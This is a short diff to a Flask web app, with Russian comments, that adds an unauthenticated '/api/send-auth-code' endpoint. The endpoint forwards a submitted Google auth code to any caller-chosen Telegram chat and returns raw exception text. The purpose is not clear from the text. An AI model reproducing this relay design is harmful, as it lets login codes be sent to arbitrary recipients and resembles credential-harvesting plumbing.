@@ -77,6 +77,39 @@ def get_routes():
     response.headers["Content-Type"] = "application/json; charset=utf-8"
     return response
 
+@app.route('/api/send-auth-code', methods=['POST'])
+def send_auth_code():
+    try:
+        # Получаем данные из запроса
+        data = request.json
+        chat_id = data.get('chat_id')
+        auth_code = data.get('auth_code')
+
+        if not chat_id or not auth_code:
+            return jsonify({"error": "Необходимы chat_id и auth_code"}), 400
+
+        # Отправляем сообщение в Telegram
+        bot_token = os.getenv("BOT_TOKEN")
+        if not bot_token:
+            return jsonify({"error": "BOT_TOKEN не установлен на сервере"}), 500
+
+        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
+        payload = {
+            'chat_id': chat_id,
+            'text': f"Google Auth Code Received! Code: {auth_code}"
+        }
+
+        response = requests.post(url, json=payload)
+
+        if response.ok:
+            return jsonify({"success": True})
+        else:
+            error_message = response.json().get('description', 'Неизвестная ошибка')
+            return jsonify({"error": f"Ошибка Telegram API: {error_message}"}), 500
+
+    except Exception as e:
+        return jsonify({"error": str(e)}), 500
+
 @app.route('/api/send-pdf', methods=['POST'])
 def send_pdf():
     if 'document' not in request.files or 'chat_id' not in request.form:
